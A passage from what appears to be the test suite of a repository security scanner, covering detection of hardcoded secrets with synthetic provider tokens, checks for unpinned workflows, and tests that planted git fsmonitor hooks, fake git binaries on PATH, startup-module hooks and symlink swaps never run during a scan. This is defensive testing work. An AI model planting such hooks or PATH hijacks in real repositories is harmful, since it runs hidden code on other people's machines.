        self.assertLess(direct_elapsed, 1.0, f"direct shell scan took {direct_elapsed:.3f}s")
        self.assertLess(pipe_elapsed, 1.5, f"non-fetch pipeline scan took {pipe_elapsed:.3f}s")
        self.assertLess(command_flood_elapsed, 1.5, f"shell token budget took {command_flood_elapsed:.3f}s")
        self.assertLess(scan_elapsed, 3.0, f"full scanner took {scan_elapsed:.3f}s")
        self.assertEqual(0, completed.returncode)

    def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            ".github/workflows/release.yml",
            "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@"
            + ("a" * 40)
            + "\n  - { uses: owner/flow-action@v4 }\n"
            + "  - { 'uses': 'owner/quoted-action@v4' }\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        action_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-AUTOMATION-UNPINNED"]
        self.assertEqual(3, len(action_findings))
        self.assertEqual({2, 4, 5}, {finding["line"] for finding in action_findings})

    def test_req_009_workflow_context_survives_directory_and_file_targets(self) -> None:
        fixture = RepositoryFixture(self)
        workflow = fixture.write(
            ".github/workflows/release.yml",
            "steps:\n  - uses: actions/checkout@v4\n",
        )
        fixture.track(".github/workflows/release.yml")

        for target in (fixture.root, workflow.parent, workflow):
            with self.subTest(target=target):
                completed = self.run_scanner(target)
                report = self.json_report(completed)
                self.assertEqual(1, completed.returncode)
                self.assertEqual(
                    ["VW-AUTOMATION-UNPINNED"],
                    [finding["rule_id"] for finding in report["findings"]],
                )

    def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        synthetic_value = "A1" + "example" + "B2C3D4E5F6"
        fixture.write("config.txt", f"password={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_009_realistic_secret_with_placeholder_prefix_is_not_placeholder(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        synthetic_value = "test-" + "RealisticCredential1234"
        fixture.write("config.txt", f"{assignment_name}={synthetic_value}\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertNotIn(synthetic_value, completed.stdout)

    def test_req_009_generic_assignment_scan_is_linear_without_value_evidence(self) -> None:
        scanner = load_scanner_module()
        candidate = scanner.Candidate(Path("config.txt"), "config.txt", None, b"config.txt")
        synthetic_value = "!LinearSyntheticCredential123456789"
        text = ("ordinary_name_" * 50_000) + f"password={synthetic_value}"
        findings: list[object] = []

        started = time.perf_counter()
        scanner._scan_text(candidate, text, findings)
        elapsed = time.perf_counter() - started
        rendered = json.dumps([finding.as_dict() for finding in findings])

        self.assertLess(elapsed, 1.5, f"generic assignment scan took {elapsed:.3f}s")
        self.assertEqual(
            ["VW-SECRET-GENERIC-ASSIGNMENT"],
            [finding.rule_id for finding in findings],
        )
        self.assertNotIn(synthetic_value, rendered)

        clean_findings: list[object] = []
        started = time.perf_counter()
        scanner._scan_text(candidate, "token" * 150_000, clean_findings)
        clean_elapsed = time.perf_counter() - started
        self.assertLess(clean_elapsed, 1.5, f"generic clean scan took {clean_elapsed:.3f}s")
        self.assertEqual([], clean_findings)

        typed_noise = ("password: string; " * 70_000)[:1_048_576]
        started = time.perf_counter()
        self.assertEqual([], list(scanner._generic_assignments(typed_noise)))
        typed_elapsed = time.perf_counter() - started
        self.assertLess(typed_elapsed, 1.5, f"typed assignment scan took {typed_elapsed:.3f}s")

    def test_req_009_generic_assignment_handles_types_subscripts_and_comments(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        values = (
            "SyntheticTypedCredential12345",
            "SyntheticBracketCredential12345",
            "SyntheticCommentCredential12345",
            "SyntheticGenericCredential12345",
            "SyntheticColonCredential=WithSuffix12345",
        )
        fixture.write(
            "config.ts",
            f'const password: string = "{values[0]}";\n'
            f'config["password"] = "{values[1]}";\n'
            f'const password /* application-owned */ = "{values[2]}";\n'
            f'const accessToken: Record<string, string> = "{values[3]}";\n'
            f"{assignment_name}: {values[4]}\n"
            "const password: string;\n"
            "const password: someValue == otherValue;\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"
        ]
        self.assertEqual({1, 2, 3, 4, 5}, {finding["line"] for finding in findings})
        for value in values:
            self.assertNotIn(value, completed.stdout)

    def test_req_009_code_identifiers_calls_and_literal_assignment_boundaries(self) -> None:
        fixture = RepositoryFixture(self)
        phrase = "Synthetic credential phrase with spaces"
        backtick_phrase = "Synthetic backtick credential phrase"
        multiline = "Synthetic first line\nSynthetic second line 12345"
        f_string_value = "SyntheticFStringCredential12345"
        token_name = "api" + "Token"
        fixture.write(
            "config.ts",
            "type Shape = { accessToken: AuthenticationCredential };\n"
            "const password = documentationOnlyValue;\n"
            "const password = buildCredential();\n"
            f'const password = "{phrase}";\n'
            f"const {token_name} = `{backtick_phrase}`;\n"
            f"const clientSecret = `{multiline}`;\n"
            "const accessToken = `${process.env.ACCESS_TOKEN}`;\n",
        )
        fixture.write(
            "fixture-factory.py",
            'fixture.write("config.py", f\'token="{escaped_value}"\\n\')\n',
        )
        fixture.write(
            "literal-f-string.py",
            f'f\'token="{f_string_value}"\'\n',
        )
        fixture.write(".env.example", "API_TOKEN=https://api.example.com/replace/me\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        generic = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-GENERIC-ASSIGNMENT"]
        self.assertEqual({1, 4, 5, 6}, {item["line"] for item in generic})
        self.assertNotIn(phrase, completed.stdout)
        self.assertNotIn(multiline, completed.stdout)
        self.assertNotIn(f_string_value, completed.stdout)

    def test_req_009_new_provider_tokens_and_mutable_workflow_images_block(self) -> None:
        fixture = RepositoryFixture(self)
        values = (
            "github_pat_" + ("A" * 40),
            "glpat-" + ("b" * 30),
            "sk-proj-" + ("c" * 30),
        )
        fixture.write("tokens.txt", "\n".join(values) + "\n")
        fixture.write(
            ".github/workflows/build.yml",
            "container: node:20\n"
            "services:\n"
            "  cache:\n"
            "    image: redis@sha256:" + ("d" * 64) + "\n"
            "  database:\n"
            "    image: postgres:17\n",
        )
        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        provider = [item for item in report["findings"] if item["rule_id"] == "VW-SECRET-PROVIDER-TOKEN"]
        automation = [item for item in report["findings"] if item["rule_id"] == "VW-AUTOMATION-UNPINNED"]
        self.assertEqual(3, len(provider))
        self.assertEqual({1, 6}, {item["line"] for item in automation})
        for value in values:
            self.assertNotIn(value, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Git fsmonitor hook execution regression uses a POSIX hook")
    def test_req_010_repository_fsmonitor_hook_is_never_executed(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")
        fixture.track("README.md")
        marker = fixture.base / "fsmonitor-executed"
        hook = fixture.root / ".git" / "hooks" / "synthetic-fsmonitor"
        hook.write_text(
            "#!/bin/sh\nprintf executed > " + str(marker) + "\nexit 0\n",
            encoding="utf-8",
        )
        hook.chmod(0o700)
        subprocess.run(
            ["git", "config", "core.fsmonitor", str(hook)],
            cwd=fixture.root,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertFalse(marker.exists())
        self.assertFalse(report["scope"]["network_used"])
        self.assertFalse(report["scope"]["files_modified"])

    def test_req_010_inherited_git_environment_cannot_mutate_or_replace_scope(self) -> None:
        fixture = RepositoryFixture(self)
        assignment_name = "pass" + "word"
        fixture.write(".gitignore", "credential.txt\n")
        fixture.write(
            "credential.txt",
            f"{assignment_name}=SyntheticTrackedCredential12345\n",
        )
        fixture.track(".gitignore")
        fixture.track("credential.txt", force=True)

        alternate_index = fixture.base / "alternate-index"
        alternate_objects = fixture.base / "alternate-objects"
        alternate_objects.mkdir()
        alternate_environment = os.environ.copy()
        alternate_environment["GIT_INDEX_FILE"] = str(alternate_index)
        subprocess.run(
            ["git", "read-tree", "--empty"],
            cwd=fixture.root,
            env=alternate_environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )
        subprocess.run(
            ["git", "add", "--", ".gitignore"],
            cwd=fixture.root,
            env=alternate_environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )

        trace = fixture.root / "git-trace.log"
        trace2 = fixture.root / "git-trace2.json"
        before = tree_digest(fixture.root)
        completed = self.run_scanner(
            fixture.root,
            environment_overrides={
                "GIT_TRACE": str(trace),
                "GIT_TRACE2_EVENT": str(trace2),
                "GIT_INDEX_FILE": str(alternate_index),
                "GIT_OBJECT_DIRECTORY": str(alternate_objects),
                "GIT_ALTERNATE_OBJECT_DIRECTORIES": str(alternate_objects),
            },
        )
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        self.assertIn(
            "VW-SECRET-GENERIC-ASSIGNMENT",
            {finding["rule_id"] for finding in report["findings"]},
        )
        self.assertFalse(trace.exists())
        self.assertFalse(trace2.exists())
        self.assertFalse(report["scope"]["files_modified"])
        self.assertEqual(before, tree_digest(fixture.root))

    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
    def test_req_010_git_from_target_or_controlled_ancestor_is_never_executed(self) -> None:
        for location in ("target", "ancestor"):
            with self.subTest(location=location):
                fixture = RepositoryFixture(self)
                fixture.write("README.md", "ordinary\n")
                executable_directory = fixture.root / "bin" if location == "target" else fixture.base
                executable_directory.mkdir(exist_ok=True)
                marker = fixture.base / f"git-executed-{location}"
                fake_git = executable_directory / "git"
                fake_git.write_text(f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n", encoding="utf-8")
                fake_git.chmod(0o700)

                completed = self.run_scanner(
                    fixture.root,
                    environment_overrides={"PATH": str(executable_directory)},
                )
                report = self.json_report(completed)
                self.assertEqual(0, completed.returncode)
                self.assertEqual("filesystem", report["scope"]["mode"])
                self.assertFalse(marker.exists())

    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
    def test_req_010_git_from_repository_sibling_path_is_never_executed(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("target/README.md", "ordinary\n")
        executable_directory = fixture.root / "bin"
        executable_directory.mkdir()
        marker = fixture.base / "git-executed-from-repository-sibling"
        fake_git = executable_directory / "git"
        fake_git.write_text(
            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n",
            encoding="utf-8",
        )
        fake_git.chmod(0o700)

        completed = self.run_scanner(
            fixture.root / "target",
            environment_overrides={"PATH": str(executable_directory)},
        )
        report = self.json_report(completed)

        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertFalse(marker.exists())

    @unittest.skipIf(os.name == "nt", "Executable marker regression uses a POSIX script")
    def test_req_010_nested_git_marker_cannot_narrow_controlled_path_boundary(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("target/.git/HEAD", "ref: refs/heads/main\n")
        fixture.write("target/README.md", "ordinary\n")
        executable_directory = fixture.root / "bin"
        executable_directory.mkdir()
        marker = fixture.base / "git-executed-after-nested-marker"
        fake_git = executable_directory / "git"
        fake_git.write_text(
            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 0\n",
            encoding="utf-8",
        )
        fake_git.chmod(0o700)

        completed = self.run_scanner(
            fixture.root / "target",
            environment_overrides={"PATH": str(executable_directory)},
        )
        report = self.json_report(completed)

        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertFalse(marker.exists())

    def test_req_010_isolated_python_ignores_project_startup_and_import_hooks(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        import_marker = fixture.base / "queue-imported"
        startup_marker = fixture.base / "sitecustomize-imported"
        fixture.write(
            "queue.py",
            f"from pathlib import Path\nPath({str(import_marker)!r}).write_text('executed')\n",
        )
        fixture.write(
            "sitecustomize.py",
            f"from pathlib import Path\nPath({str(startup_marker)!r}).write_text('executed')\n",
        )
        fixture.write("README.md", "ordinary\n")

        completed = self.run_scanner(
            fixture.root,
            environment_overrides={"PYTHONPATH": str(fixture.root)},
        )
        report = self.json_report(completed)

        self.assertEqual(0, completed.returncode)
        self.assertEqual([], report["tool_errors"])
        self.assertFalse(import_marker.exists())
        self.assertFalse(startup_marker.exists())

    @unittest.skipIf(os.name == "nt", "PATH symlink regression uses POSIX executable semantics")
    def test_req_010_git_from_worktree_path_symlink_is_never_executed(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")
        controlled_directory = fixture.base / "controlled"
        controlled_directory.mkdir()
        marker = fixture.base / "git-executed-through-symlink"
        fake_git = controlled_directory / "git"
        fake_git.write_text(
            f"#!/bin/sh\nprintf executed > '{marker}'\nexit 1\n",
            encoding="utf-8",
        )
        fake_git.chmod(0o700)
        worktree_path = fixture.root / "bin"
        worktree_path.symlink_to(controlled_directory, target_is_directory=True)
        root_alias = fixture.base / "root-alias"
        root_alias.symlink_to(fixture.root, target_is_directory=True)

        for path_entry in (worktree_path, root_alias / "bin"):
            with self.subTest(path_entry=path_entry):
                completed = self.run_scanner(
                    fixture.root,
                    environment_overrides={"PATH": str(path_entry)},
                )
                report = self.json_report(completed)

                self.assertEqual(0, completed.returncode)
                self.assertEqual("filesystem", report["scope"]["mode"])
                self.assertFalse(marker.exists())

    @unittest.skipUnless(os.name == "nt", "Windows PATH junction regression")
    def test_req_010_git_from_worktree_path_junction_is_rejected(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        controlled_directory = fixture.base / "controlled"
        controlled_directory.mkdir()
        shutil.copy2(sys.executable, controlled_directory / "git.exe")
        worktree_path = fixture.root / "bin"
        created = subprocess.run(
            ["cmd", "/c", "mklink", "/J", str(worktree_path), str(controlled_directory)],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if created.returncode != 0:
            self.skipTest(f"junction creation unavailable: {created.stderr.strip()}")

        with mock.patch.dict(os.environ, {"PATH": str(worktree_path)}):
            with self.assertRaises(scanner.GitUnavailable):
                scanner._resolve_git_executable(fixture.root)

    def test_req_011_sensitive_env_metadata_survives_content_skips(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(".env.oversized", "A" * 129)
        fixture.write(".env.nul", b"TOKEN=SyntheticCredential123\0")
        fixture.write(".env.invalid-utf8", b"TOKEN=\xff\xfe")
        fixture.write(".env.binary.png", b"\x89PNG\r\n\x1a\n")
        fixture.track(".env.oversized", ".env.nul", ".env.invalid-utf8", ".env.binary.png")

        completed = self.run_scanner(
            fixture.root,
            "json",
            "--max-file-bytes",
            "128",
        )
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        env_findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-ENV-TRACKED"
        ]
        self.assertEqual(
            {".env.binary.png", ".env.invalid-utf8", ".env.nul", ".env.oversized"},
            {finding["path"] for finding in env_findings},
        )
        self.assertEqual(1, report["summary"]["skipped_by_reason"]["oversized"])
        self.assertEqual(3, report["summary"]["skipped_by_reason"]["binary"])

    def test_req_011_opened_descriptor_identity_change_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("data.txt", "ordinary inside content\n").resolve(strict=True)
        outside_value = "outside-" + synthetic_cloud_key()
        outside_path = fixture.base / "outside.txt"
        outside_path.write_text(outside_value, encoding="utf-8")
        outside_path = outside_path.resolve(strict=True)
        original_open = scanner._open_readonly

        def redirected_open(path: Path) -> int:
            self.assertEqual(candidate_path, Path(path))
            return original_open(outside_path)

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_open_readonly", side_effect=redirected_open):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        rendered = scanner.render_json(report)
        self.assertNotIn(outside_value, rendered)

    def test_req_011_scan_root_object_swap_fails_closed_before_enumeration(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        fixture.write("inside.txt", "ordinary inside content\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "outside.txt").write_text(outside_value, encoding="utf-8")
        original_directory = fixture.base / "original"
        original_resolve = scanner._resolve_strict
        swapped = False

        def swapping_resolve(path: Path) -> Path:
            nonlocal swapped
            if not swapped and Path(path) == fixture.root:
                swapped = True
                fixture.root.rename(original_directory)
                outside_directory.rename(fixture.root)
            return original_resolve(path)

        report = scanner.Report()
        with mock.patch.object(scanner, "_resolve_strict", side_effect=swapping_resolve):
            candidates, root_guard = scanner._enumerate_candidates(fixture.root, 100, report)

        self.assertTrue(swapped)
        self.assertEqual([], candidates)
        self.assertIsNone(root_guard)
        self.assertEqual("tool.target-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        self.assertNotIn(outside_value, scanner.render_json(report))

    def test_req_011_resolved_root_identity_mismatch_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        fixture.write("inside.txt", "ordinary inside content\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "outside.txt").write_text(outside_value, encoding="utf-8")

        report = scanner.Report()
        with mock.patch.object(
            scanner,
            "_resolve_strict",
            return_value=outside_directory.resolve(strict=True),
        ):
            candidates, root_guard = scanner._enumerate_candidates(fixture.root, 100, report)

        self.assertEqual([], candidates)
        self.assertIsNone(root_guard)
        self.assertEqual("tool.target-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        self.assertNotIn(outside_value, scanner.render_json(report))

    def test_req_011_windows_name_surrogate_reparse_is_a_redirect(self) -> None:
        scanner = load_scanner_module()
        junction = types.SimpleNamespace(
            st_mode=scanner.stat.S_IFDIR,
            st_reparse_tag=0xA0000003,
        )
        fallback = types.SimpleNamespace(
            st_mode=scanner.stat.S_IFDIR,
            st_file_attributes=scanner.stat.FILE_ATTRIBUTE_REPARSE_POINT,
        )
        regular = types.SimpleNamespace(st_mode=scanner.stat.S_IFDIR, st_reparse_tag=0)

        self.assertTrue(scanner._is_path_redirect(junction))
        self.assertTrue(scanner._is_path_redirect(fallback))
        self.assertFalse(scanner._is_path_redirect(regular))

    def test_req_011_ancestor_symlink_swap_fails_closed_before_read(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("safe/data.txt", "ordinary inside content\n").resolve(strict=True)
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        outside_directory = outside_directory.resolve(strict=True)
        outside_value = "outside-" + synthetic_cloud_key()
        (outside_directory / "data.txt").write_text(outside_value, encoding="utf-8")
        original_open = scanner._open_readonly
        swapped = False

        def swapping_open(path: Path) -> int:
            nonlocal swapped
            if not swapped and Path(path) == candidate_path:
                swapped = True
                safe_directory = scan_root / "safe"
                safe_directory.rename(scan_root / "safe-original")
                safe_directory.symlink_to(outside_directory, target_is_directory=True)
            return original_open(path)

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "safe/data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_open_readonly", side_effect=swapping_open):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertTrue(swapped)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)
        rendered = scanner.render_json(report)
        self.assertNotIn(outside_value, rendered)

    def test_req_011_content_metadata_change_during_read_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        scan_root = fixture.root.resolve(strict=True)
        candidate_path = fixture.write("data.txt", "ordinary content\n").resolve(strict=True)
        original_fstat = scanner._descriptor_stat
        calls = 0

        def changing_fstat(descriptor: int) -> object:
            nonlocal calls
            calls += 1
            current = original_fstat(descriptor)
            if calls == 1:
                return current
            return types.SimpleNamespace(
                st_mode=current.st_mode,
                st_dev=current.st_dev,
                st_ino=current.st_ino,
                st_size=current.st_size,
                st_mtime_ns=current.st_mtime_ns + 1,
                st_ctime_ns=current.st_ctime_ns,
            )

        report = scanner.Report()
        candidate = scanner.Candidate(candidate_path, "data.txt", None)
        root_guard = make_root_guard(scanner, scan_root)
        with mock.patch.object(scanner, "_descriptor_stat", side_effect=changing_fstat):
            result = scanner._read_candidate(candidate, root_guard, 1024, report)

        self.assertIsNone(result)
        self.assertEqual(2, calls)
        self.assertEqual("tool.file-race", report.tool_errors[0].code)
        self.assertEqual(2, report.exit_code)

    def test_req_011_complete_distinct_approver_warning_suppression(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted in console" '
            'owner="app-team" approved-by="security-team" '
            'compensating-control="deny by default rules" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual(1, len(report["findings"]))
        finding = report["findings"][0]
        self.assertTrue(finding["suppressed"])
        self.assertTrue(finding["suppression"]["metadata_complete"])
        self.assertTrue(finding["suppression"]["approver_identifier_distinct"])
        self.assertFalse(finding["suppression"]["approver_independence_verified"])
        self.assertTrue(finding["suppression"]["values_redacted"])
        self.assertEqual(1, report["summary"]["suppressed_warnings"])
        self.assertEqual(1, report["summary"]["required_manual_checks"])
        self.assertNotIn(firebase, completed.stdout)
        self.assertNotIn("app-team", completed.stdout)
        self.assertNotIn("security-team", completed.stdout)

    def test_req_011_incomplete_same_owner_or_expired_suppression_fails(self) -> None:
        cases = (
            'reason="reviewed" owner="same" approved-by="same" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app-team" approved-by="app\u200b-team" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="security" compensating-control="rules" expires="2000-01-01"',
            'reason="reviewed" owner="app" approved-by="security" expires="2099-01-01"',
            'reason="reviewed" owner="\u200b" approved-by="security" compensating-control="rules" expires="2099-01-01"',
            'reason="\u200b" owner="app" approved-by="security" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="\u200b" compensating-control="rules" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="security" compensating-control="\u200b" expires="2099-01-01"',
            'reason="\u034f" owner="\u034f" approved-by="\u034f\u034f" compensating-control="\u034f" expires="2099-01-01"',
            'reason="reviewed" owner="app" approved-by="app\u034f" compensating-control="rules" expires="2099-01-01"',
        )
        for metadata in cases:
            with self.subTest(metadata=metadata):
                fixture = RepositoryFixture(self)
                firebase = synthetic_firebase_key()
                fixture.write(
                    "config.js",
                    f'const firebaseApiKey = "{firebase}"; // vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}\n',
                )
                completed = self.run_scanner(fixture.root)
                report = self.json_report(completed)
                self.assertEqual(1, completed.returncode)
                rule_ids = {finding["rule_id"] for finding in report["findings"]}
                self.assertIn("VW-SUPPRESSION-INVALID", rule_ids)
                public_finding = next(
                    finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
                )
                self.assertFalse(public_finding["suppressed"])
                self.assertNotIn(firebase, completed.stdout)

    @unittest.skipIf(os.name == "nt", "Backslash is a path separator on Windows")
    def test_req_011_display_path_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write("a/b.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
        fixture.write(r"a\b.js", f'const firebaseApiKey = "{firebase}";\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))

    def test_req_011_redacted_filename_collision_cannot_cross_suppress(self) -> None:
        fixture = RepositoryFixture(self)
        firebase = synthetic_firebase_key()
        assignment_name = "to" + "ken"
        first_secret = "First" + "SyntheticSecret1234"
        second_secret = "Second" + "SyntheticSecret5678"
        marker = (
            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
            'owner="app" approved-by="security" compensating-control="deny rules" '
            'expires="2099-01-01"'
        )
        fixture.write(
            f"{assignment_name}={first_secret}",
            f'const firebaseApiKey = "{firebase}"; // {marker}\n',
        )
        fixture.write(
            f"{assignment_name}={second_secret}",
            f'const firebaseApiKey = "{firebase}";\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
        ]
        self.assertEqual(2, len(findings))
        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
        self.assertEqual(1, report["summary"]["active_warnings"])
        self.assertEqual(2, len({finding["path"] for finding in findings}))
        self.assertTrue(
            all("__vibeworthy_redacted_path_" in finding["path"] for finding in findings)
        )
        self.assertNotIn(first_secret, completed.stdout)
        self.assertNotIn(second_secret, completed.stdout)

    def test_req_011_blocker_cannot_be_suppressed(self) -> None:
        fixture = RepositoryFixture(self)
        privileged = synthetic_supabase_key("secret")
        marker = (
            'vibeworthy:ignore VW-SUPABASE-PRIVILEGED-KEY reason="accepted" '
            'owner="app" approved-by="security" compensating-control="server only" expires="2099-01-01"'
        )
        fixture.write("config.js", f'const backendCredential = "{privileged}"; // {marker}\n')

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-SUPABASE-PRIVILEGED-KEY", rule_ids)
        self.assertIn("VW-SUPPRESSION-BLOCKER", rule_ids)
        privileged_finding = next(
            finding for finding in report["findings"] if finding["rule_id"] == "VW-SUPABASE-PRIVILEGED-KEY"
        )
        self.assertFalse(privileged_finding["suppressed"])
        self.assertNotIn(privileged, completed.stdout)

    def test_req_010_usage_and_tool_failures_return_two_as_structured_output(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "clean\n")

        invalid_limit = self.run_scanner(fixture.root, "json", "--max-file-bytes", "0")
        invalid_report = self.json_report(invalid_limit)
        self.assertEqual(2, invalid_limit.returncode)
        self.assertEqual(2, invalid_report["exit_code"])
        self.assertEqual("usage.invalid-arguments", invalid_report["tool_errors"][0]["code"])

        missing = self.run_scanner(fixture.root / "missing", "sarif")
        self.assertEqual(2, missing.returncode)
        missing_report = json.loads(missing.stdout)
        invocation = missing_report["runs"][0]["invocations"][0]
        self.assertFalse(invocation["executionSuccessful"])
        self.assertEqual(2, invocation["exitCode"])
        self.assertTrue(invocation["toolExecutionNotifications"])
        self.assertNotIn(str(fixture.root), missing.stdout)

    def test_req_011_nul_manifest_and_aggregate_budgets_fail_closed(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("package.json", b'{"dependencies":{}}\0')
        nul_report = self.json_report(self.run_scanner(fixture.root))
        self.assertEqual("tool.manifest-binary", nul_report["tool_errors"][0]["code"])

        scanner = load_scanner_module()
        budget_fixture = RepositoryFixture(self, git=False)
        budget_fixture.write("one.txt", "ordinary-one\n")
        budget_fixture.write("two.txt", "ordinary-two\n")
        with mock.patch.object(scanner, "DEFAULT_MAX_TOTAL_BYTES", 8):
            byte_report = scanner.scan_path(budget_fixture.root)
        self.assertEqual(2, byte_report.exit_code)
        self.assertEqual([], byte_report.findings)
        self.assertEqual("tool.byte-limit", byte_report.tool_errors[0].code)

        finding_fixture = RepositoryFixture(self, git=False)
        finding_fixture.write(
            "tokens.txt",
            ("github_pat_" + ("A" * 40)) + "\n" + ("glpat-" + ("b" * 30)) + "\n",
        )
        with mock.patch.object(scanner, "DEFAULT_MAX_FINDINGS", 1):
            finding_report = scanner.scan_path(finding_fixture.root)
        self.assertEqual(2, finding_report.exit_code)
        self.assertEqual([], finding_report.findings)
        self.assertEqual("tool.finding-limit", finding_report.tool_errors[0].code)

        redaction_fixture = RepositoryFixture(self, git=False)
        redaction_fixture.write(
            "config.env",
            "password_one=FirstUniqueCredential123\n"
